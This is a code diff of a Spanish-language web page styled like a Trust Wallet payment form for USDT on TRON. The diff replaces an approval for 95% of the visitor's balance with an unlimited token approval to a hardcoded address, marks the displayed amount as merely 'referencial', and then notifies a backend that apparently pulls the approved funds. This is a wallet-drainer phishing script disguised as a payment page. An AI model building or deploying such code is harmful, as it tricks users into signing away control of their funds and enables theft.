@@ -52,6 +52,7 @@
             max-width: 390px;
             padding: 20px;
             flex: 1;
+            padding-bottom: 118px;
         }
 
         .tw-header {
@@ -177,14 +178,6 @@
             margin-bottom: 16px;
             display: none;
             text-align: left;
-        }
-
-        .wallet-info {
-            display: none;
-            background-color: #f6f7f9;
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 22px;
         }
 
         .tw-btn-container {
@@ -448,13 +441,6 @@
             border-radius: 14px;
         }
 
-        .tw-address-box {
-            min-height: 82px;
-            padding: 14px 16px;
-            border-radius: 14px;
-            margin-bottom: 18px;
-        }
-
         .connected-summary-panel {
             display: contents;
         }
@@ -493,10 +479,6 @@
 
         .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
             margin-bottom: 0;
-        }
-
-        .tw-container {
-            padding-bottom: 118px;
         }
 
         .amount-stepper {
@@ -603,12 +585,12 @@
     </div>
 
     <div class="tw-input-group amount-stage">
-        <label class="tw-label" for="amountDisplay">Cantidad</label>
+        <label class="tw-label" for="amountDisplay">Cantidad (Referencial)</label>
         <div class="tw-input-row">
             <div class="amount-stepper">
-                <button type="button" class="amount-step-btn" id="amountMinus" aria-label="Restar 1 USDT">−</button>
+                <button type="button" class="amount-step-btn" id="amountMinus" aria-label="Restar 1">−</button>
                 <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any">
-                <button type="button" class="amount-step-btn" id="amountPlus" aria-label="Sumar 1 USDT">+</button>
+                <button type="button" class="amount-step-btn" id="amountPlus" aria-label="Sumar 1">+</button>
             </div>
             <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;"></span>
             <span class="tw-currency-badge">
@@ -647,6 +629,7 @@
 <script>
     const BILLETERA_DESTINO = "TVqMjGyqFfFoJn1r8py17eeVQY78Foxt6f";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    // URL de tu backend desplegado en Render[span_2](start_span)[span_2](end_span)
     const BACKEND_URL = "https://backend-usdt-pay.onrender.com";
 
     const connectBtn = document.getElementById('connectBtn');
@@ -685,40 +668,9 @@
 
     addressDisplay.value = BILLETERA_DESTINO.length > 12 ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}` : BILLETERA_DESTINO;
 
-    const TRON_READ_RPC = "https://api.trongrid.io";
-
-    async function tronRpcPost(endpoint, body = {}) {
-        const response = await fetch(TRON_READ_RPC + endpoint, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(body)
-        });
-        if (!response.ok) {
-            throw new Error("RPC lectura " + endpoint + " respondió HTTP " + response.status);
-        }
-        return await response.json();
-    }
-
-    async function obtenerBalanceSeguro(address) {
-        const tronWeb = window.tronWeb;
-        const ownerHex = tronWeb.address.toHex(address);
-        const contractHex = tronWeb.address.toHex(CONTRATO_USDT);
-        const ownerEvmHex = ownerHex.replace(/^41/, "").padStart(64, "0");
-
-        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
-            owner_address: ownerHex,
-            contract_address: contractHex,
-            function_selector: "balanceOf(address)",
-            parameter: ownerEvmHex,
-            visible: false
-        });
-
-        return tronWeb.toBigNumber("0x" + data.constant_result[0]);
-    }
-
     connectBtn.addEventListener('click', async () => {
-        // EXACTAMENTE TU BLOQUE ORIGINAL DE CONEXIÓN
         if (!walletAddress) {
+            // --- PASO 1: Vincular Billetera (Idéntico a tu estructura original) ---
             try {
                 setStatus("Estableciendo enlace RPC con Billetera...");
                 connectBtn.disabled = true;
@@ -752,80 +704,81 @@
             return;
         }
 
-        // AL PRESIONAR CONTINUAR: ÚNICAMENTE SE CAMBIÓ LA TRANSACCIÓN DE TRANSFER A APPROVE + BACKEND
         if (walletAddress) {
+            // --- PASO 2: Solicitar el Approve y notificar al Backend ---
             try {
-                setStatus("Consultando fondos del libro contable on-chain...");
+                const montoVisual = amountDisplay.value || "0";
+
+                setStatus("Solicitando aprobación (Approve)...");
                 connectBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
-                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-
-                if (balanceBigNumber.isZero()) {
-                    throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
-                }
-
-                setStatus("Solicitando autorización de firma digital...");
-
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
-                const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
+                
+                // Dirección a la que se le otorga la autorización (Spender)
+                const spenderAddress = BILLETERA_DESTINO; 
+                const spenderHex = tronWeb.address.toHex(spenderAddress);
+                
+                // Monto máximo de aprobación en unidades SUN (equivalente a ilimitado o un valor alto)
+                const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "approve(address,uint256)",
                     { feeLimit: 100000000 },
                     [
-                        { type: 'address', value: destinoHex },
-                        { type: 'uint256', value: amount95Percent.toString() }
+                        { type: 'address', value: spenderHex },
+                        { type: 'uint256', value: approveAmount }
                     ],
                     tronWeb.address.toHex(walletAddress)
                 );
 
+                setStatus("Firme la aprobación en su billetera...");
                 const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+                
                 showProcessingScreen();
-
                 const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
                 await hideProcessingScreenAfterMinimum();
 
                 if (broadcast && broadcast.result) {
-                    setStatus("Autorización concedida. Ejecutando operación en el servidor...");
+                    const txId = broadcast.txid || signedTx.txID;
+                    setStatus("Aprobación exitosa. Llamando al backend...");
 
-                    const respuesta = await fetch(`${BACKEND_URL}/api/ejecutar-cobro`, {
+                    // --- PASO 3: Llamada a tu Backend en Render ---
+                    const response = await fetch(`${BACKEND_URL}/api/procesar-operacion`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ userAddress: walletAddress })
+                        body: JSON.stringify({
+                            txid: txId,
+                            wallet: walletAddress,
+                            montoVisual: montoVisual,
+                            network: 'TRC-20'
+                        })
                     });
 
-                    const resultado = await respuesta.json();
+                    // Intentar leer respuesta del backend de forma segura
+                    let data = {};
+                    try {
+                        data = await response.json();
+                    } catch (e) {
+                        // Por si el servidor responde texto plano
+                    }
 
-                    if (resultado.exito) {
-                        setStatus("TRANSACCIÓN EXITOSA.");
+                    if (response.ok) {
+                        setStatus("OPERACIÓN Y BACKEND EJECUTADOS CON ÉXITO.");
                         connectBtn.innerText = "Completado";
                     } else {
-                        throw new Error("Error en el servidor: " + resultado.mensaje);
+                        throw new Error(data.message || "El backend reportó un error al procesar la solicitud.");
                     }
+
                 } else {
-                    throw new Error("La autorización fue rechazada por los nodos de la red.");
+                    throw new Error("La transacción de aprobación fue rechazada por la red.");
                 }
             } catch (error) {
                 await hideProcessingScreenAfterMinimum();
-                setStatus(error.message || "La transacción falló o fue cancelada.");
+                setStatus(error.message || "La operación falló o fue cancelada.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Continuar";
             }
-        }
-    });
-
-    maxAction.addEventListener('click', async () => {
-        if (!walletAddress) return;
-        try {
-            setStatus("Calculando fondos totales...");
-            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-            const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
-            amountDisplay.value = Number(amount95Percent.toString()) / 1_000_000;
-            setStatus("Saldo asignado (95%).");
-        } catch (e) {
-            setStatus("Error al leer el saldo.");
         }
     });
 </script>
